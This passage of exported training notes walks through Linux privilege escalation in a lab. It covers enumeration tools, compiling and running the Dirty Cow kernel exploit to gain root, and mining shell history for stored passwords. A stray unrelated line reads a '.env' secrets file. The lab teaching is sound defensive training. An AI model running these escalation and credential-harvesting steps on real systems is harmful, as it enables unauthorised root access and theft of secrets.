href="https://www.google.com/url?q=https://github.com/sleventyeleven/linuxprivchecker&amp;sa=D&amp;source=editors&amp;ust=1699590511524843&amp;usg=AOvVaw0Fr916f3npBjLRXdhiBmUE">https://github.com/sleventyeleven/linuxprivchecker</a></span></li></ul><p class="c3 c5"><span class="c1"></span></p><ol class="c8 lst-kix_list_130-0" start="10"><li class="c0 c5 li-bullet-0"><span class="c9">Exploring Automated Tools for Enumeration:</span></li></ol><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_139-0"><li class="c0 c5 li-bullet-0"><span class="c2">LinPEAS Tool: </span><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&amp;sa=D&amp;source=editors&amp;ust=1699590511525425&amp;usg=AOvVaw1DRbXuAdeFynVQY7s4KzRc">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></span></li></ul><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 133.00px;"><img alt="" src="images/image67.jpg" style="width: 624.00px; height: 133.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_140-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">To run LinPEAS, type: TCM@debian:~/tools/linpeas$ ./linpeas.sh</span></li></ul><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 394.00px;"><img alt="" src="images/image57.jpg" style="width: 624.00px; height: 394.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c24 c5"><span class="c9">-You can begin by going over any yellow or red findings, below is one example:</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 104.00px;"><img alt="" src="images/image55.jpg" style="width: 624.00px; height: 104.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c2">---------------------------------------------</span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_43-0"><li class="c0 li-bullet-0"><span class="c9">LinPEAS:</span></li></ul><p class="c3 c5"><span class="c9"></span></p><ul class="c8 lst-kix_list_141-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Let&rsquo;s run LinPEAS against our HackTheBox machine, let&rsquo;s download the LinPEAS.sh script, and save it locally so that we can point it to run at whatever we want (there may be a way to run it differently, I want keep moving things along and not go down too many irrelevant rabbit holes!). &nbsp;So let&rsquo;s navigate to the LinPEAS GitHub page from inside our Kali box: </span><span class="c26"><a class="c6" href="https://www.google.com/url?q=https://github.com/carlospolop/PEASS-ng&amp;sa=D&amp;source=editors&amp;ust=1699590511526424&amp;usg=AOvVaw2uUP3vtSvYf6qcVlYnAOSb">https://github.com/carlospolop/PEASS-ng</a></span></li></ul><p class="c27 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 146.00px;"><img alt="" src="images/image61.png" style="width: 624.00px; height: 146.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_142-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Next, to select the LinPEAS.sh script for download, choose &ldquo;linPEAS&rdquo;:</span></li></ul><p class="c27 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 281.00px;"><img alt="" src="images/image59.png" style="width: 624.00px; height: 281.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_143-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Next, choose &ldquo;linpeas.sh&rdquo;:</span></li></ul><p class="c18 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 386.00px;"><img alt="" src="images/image52.png" style="width: 624.00px; height: 386.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_144-0 start"><li class="c15 c5 li-bullet-0"><span class="c9">Next, choose &ldquo;Raw&rdquo;:</span></li></ul><p class="c5 c49 c54"><span class="c2"></span></p><p class="c5 c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 408.00px;"><img alt="" src="images/image51.png" style="width: 624.00px; height: 408.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_145-0 start"><li class="c15 c5 li-bullet-0"><span class="c9">After you choose Raw, right-click and &ldquo;Select-All&rdquo;, then paste into Kali&rsquo;s &ldquo;MousePad&rdquo; text editor (or any text editor), and choose &ldquo;Save As&rdquo;:</span></li></ul><p class="c18 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 339.00px;"><img alt="" src="images/image20.png" style="width: 624.00px; height: 339.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_146-0 start"><li class="c15 c5 li-bullet-0"><span class="c9">You want to make sure before you actually save to change the default &ldquo;Save As&rdquo; from &ldquo;Text Files&rdquo; to &ldquo;All Files&rdquo; because you are going to append with a shell extension so we can easily run the script. &nbsp;Name the file &ldquo;linpeas.sh&rdquo;, and I like saving things right onto my Desktop so that I can quickly find them. Our file should look like this right before we hit &ldquo;Save&rdquo;:</span></li></ul><p class="c18 c5 c49"><span class="c1"></span></p><ul class="c8 lst-kix_list_146-0"><li class="c15 c5 li-bullet-0"><span class="c9">Next, just hit the &ldquo;x&rdquo; box and close the script. &nbsp;It can sit on the Desktop until we need it.:</span></li></ul><p class="c4 c5"><span class="c32">recyclops file ../hubot/.env</span></p><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span class="c2">---------------------------------------------</span></p><p class="c3 c5"><span class="c1"></span></p><ul class="c8 lst-kix_list_147-0 start"><li class="c0 c5 li-bullet-0"><span class="c2">LinEum Tool: </span><span class="c11"><a class="c6" href="https://www.google.com/url?q=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&amp;sa=D&amp;source=editors&amp;ust=1699590511528331&amp;usg=AOvVaw0SR6JtCs1XdJfLGCE0XNiV">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></span></li></ul><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 114.00px;"><img alt="" src="images/image13.jpg" style="width: 624.00px; height: 114.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_148-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">To run LinEnum, type: TCM@debian:~/tools/linenum$ ./linenum.sh</span></li></ul><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 213.00px;"><img alt="" src="images/image11.jpg" style="width: 624.00px; height: 213.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c24 c5"><span class="c9">-You can begin by going over any yellow or red findings, below is one example:</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 701.27px; height: 561.00px;"><img alt="" src="images/image17.jpg" style="width: 701.27px; height: 561.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_149-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">Linux Exploit Suggester: </span><span class="c13"><a class="c6" href="https://www.google.com/url?q=https://github.com/The-Z-Labs/linux-exploit-suggester&amp;sa=D&amp;source=editors&amp;ust=1699590511529212&amp;usg=AOvVaw23hBwIwVPRSrC9m0RWdFZF">https://github.com/The-Z-Labs/linux-exploit-suggester</a></span></li></ul><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 111.00px;"><img alt="" src="images/image15.jpg" style="width: 624.00px; height: 111.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_150-0 start"><li class="c0 c5 li-bullet-0"><span class="c1">To run Linux Exploit Suggester, type: TCM@debian:~/tools/linux-exploit-suggester$ ./linux-exploit-suggester.sh</span></li></ul><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 608.00px; height: 141.00px;"><img alt="" src="images/image5.jpg" style="width: 608.00px; height: 141.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><p class="c5 c24"><span class="c9">-You can begin by going over any yellow or red findings, below is one example:</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 588.00px; height: 827.00px;"><img alt="" src="images/image3.jpg" style="width: 588.00px; height: 827.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><ol class="c8 lst-kix_list_151-0 start" start="11"><li class="c0 c5 li-bullet-0"><span class="c9">Escalation via Kernel Exploits:</span></li></ol><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_152-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Remember this from earlier? &ldquo;uname -a&rdquo; will tell us what Kernel the machine is running, which will in turn help us search for exploits against that box:</span></li></ul><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 51.00px;"><img alt="" src="images/image9.jpg" style="width: 624.00px; height: 51.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_152-0"><li class="c0 c5 li-bullet-0"><span class="c9">We can just copy and pasta the Linux Debian version:</span></li></ul><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 52.00px;"><img alt="" src="images/image7.jpg" style="width: 624.00px; height: 52.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_152-0"><li class="c0 c5 li-bullet-0"><span class="c9">Then we can plug that into Google and see if there are any exploits/vulns against it:</span></li></ul><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 377.00px;"><img alt="" src="images/image1.jpg" style="width: 624.00px; height: 377.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ul class="c8 lst-kix_list_152-0"><li class="c0 c5 li-bullet-0"><span class="c9">The &ldquo;Dirty Cow&rdquo; exploit looks promising:</span></li></ul><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 324.00px;"><img alt="" src="images/image223.jpg" style="width: 624.00px; height: 324.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c9">-You may recall when we rean Linux Exploit Suggester, it also listed &ldquo;Dirty Cow&rdquo;:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 183.00px;"><img alt="" src="images/image225.jpg" style="width: 624.00px; height: 183.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c9">-You may also remember seeing something called &ldquo;Dirty Cow&rdquo; in our &ldquo;tools&rdquo; folder earlier:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 133.00px;"><img alt="" src="images/image224.jpg" style="width: 624.00px; height: 133.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c9">-First we need to compile it before we can run it, so we can type the following which outputs a compiled version via gcc, to a file called &ldquo;cow&rdquo;:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~/tools/dirtycow$ gcc -pthread c0w.c -o cow</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 585.00px; height: 54.00px;"><img alt="" src="images/image220.png" style="width: 585.00px; height: 54.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">-Now if we do an &ldquo;ls&rdquo;, we see it&rsquo;s sitting in there compiled:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 331.00px; height: 71.00px;"><img alt="" src="images/image219.jpg" style="width: 331.00px; height: 71.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c9">-Now let&rsquo;s do a quick &ldquo;id&rdquo; and you can see we&rsquo;re the user TCM:</span></p><p class="c3 c5"><span class="c9"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 40.00px;"><img alt="" src="images/image222.jpg" style="width: 624.00px; height: 40.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c9">-Now let&rsquo;s run our exploit:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 383.00px; height: 261.00px;"><img alt="" src="images/image221.jpg" style="width: 383.00px; height: 261.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">-After running, we see it has overwritten our password:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 356.00px; height: 310.00px;"><img alt="" src="images/image217.jpg" style="width: 356.00px; height: 310.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">-So now if we type the &ldquo;passwd&rdquo; command followed by &ldquo;id&rdquo;, we see that we have become root:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 712.00px; height: 69.60px;"><img alt="" src="images/image216.jpg" style="width: 712.00px; height: 69.60px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ol class="c8 lst-kix_list_153-0 start" start="12"><li class="c0 c5 li-bullet-0"><span class="c9">Escalation via Stored Passwords:</span></li></ol><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_154-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">A good first step in our methodology is to try the &ldquo;history&rdquo; command. You may or may not have access to run it, but if you do, it will behave as such:</span></li></ul><p class="c4 c5"><span class="c2">TCM@debian:~$ history</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">(partial listing shown)</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 390.00px; height: 788.00px;"><img alt="" src="images/image218.jpg" style="width: 390.00px; height: 788.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c1"></span></p><p class="c4 c5"><span class="c9">-If you look closely, you can see we have a MySQL password that someone typed (Note that the &ndash;u stands for user, and the &ndash;p for password, so the actual user is &ldquo;root&rdquo; and password is &ldquo;password123&rdquo;:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 441.00px; height: 113.00px;"><img alt="" src="images/image193.jpg" style="width: 441.00px; height: 113.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">-There are also directories that were created, as well as permissions given:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 327.00px; height: 69.00px;"><img alt="" src="images/image192.jpg" style="width: 327.00px; height: 69.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 214.00px; height: 73.00px;"><img alt="" src="images/image195.png" style="width: 214.00px; height: 73.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">-We can also use &ldquo;grep&rdquo; alongside our &ldquo;history&rdquo; command, which might bring things to light without so much noise, but it&rsquo;s actually recommended that you don&rsquo;t shorten the history because you could miss things. But, you could try that too if you&rsquo;re in a really big hurry:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ history | grep pass</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 491.00px; height: 119.00px;"><img alt="" src="images/image194.jpg" style="width: 491.00px; height: 119.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_155-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Next, we can type &ldquo;ls -la&rdquo; which will show us the hidden files and folders, and you can see hidden there is the bash history:</span></li></ul><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ ls -la</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 558.00px; height: 302.00px;"><img alt="" src="images/image189.jpg" style="width: 558.00px; height: 302.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">-If you cat the bash history out, you can see the following:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">TCM@debian:~$ cat .bash_history</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c2">(partial listing shown)</span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 367.00px; height: 864.00px;"><img alt="" src="images/image188.jpg" style="width: 367.00px; height: 864.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c4 c5"><span class="c9">-So now we can switch user &ldquo;su&rdquo; and try those newfound creds...and we are root!:</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 416.00px; height: 117.00px;"><img alt="" src="images/image191.jpg" style="width: 416.00px; height: 117.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><ul class="c8 lst-kix_list_156-0 start"><li class="c0 c5 li-bullet-0"><span class="c9">Looting for Passwords:</span></li></ul><p class="c3 c5"><span class="c9"></span></p><ol class="c8 lst-kix_list_157-0 start" start="1"><li class="c0 c5 li-bullet-0"><span class="c9">Go to Payload All The Things:</span></li></ol><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c26"><a class="c6" href="https://www.google.com/url?q=https://github.com/swisskyrepo/PayloadsAllTheThings&amp;sa=D&amp;source=editors&amp;ust=1699590511539399&amp;usg=AOvVaw1qjkt1MHZq4QaPpwr4jrsV">https://github.com/swisskyrepo/PayloadsAllTheThings</a></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c9">OR</span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c26"><a class="c6" href="https://www.google.com/url?q=https://swisskyrepo.github.io/PayloadsAllTheThings&amp;sa=D&amp;source=editors&amp;ust=1699590511540417&amp;usg=AOvVaw3-3RU09DWTOBs58-Hs6Tt9">https://swisskyrepo.github.io/PayloadsAllTheThings</a></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 480.00px; height: 420.00px;"><img alt="" src="images/image190.jpg" style="width: 480.00px; height: 420.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3 c5"><span class="c2"></span></p><ol class="c8 lst-kix_list_157-0" start="2"><li class="c0 c5 li-bullet-0"><span class="c9">Scroll down the page and select &ldquo;Linux Privilege Escalation&rdquo;:</span></li></ol><p class="c4 c5"><span class="c26"><a class="c6" href="https://www.google.com/url?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Linux%2520-%2520Privilege%2520Escalation.md&amp;sa=D&amp;source=editors&amp;ust=1699590511541608&amp;usg=AOvVaw2xAK_mHGF4O1RhRZdwNtsG">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</a></span></p><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 471.00px;"><img alt="" src="images/image187.jpg" style="width: 624.00px; height: 471.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><ol class="c8 lst-kix_list_157-0" start="3"><li class="c0 c5 li-bullet-0"><span class="c9">Next, choose &ldquo;Looting for Passwords&rdquo;:</span></li></ol><p class="c3 c5"><span class="c2"></span></p><p class="c4 c5"><span class="c26"><a class="c6" 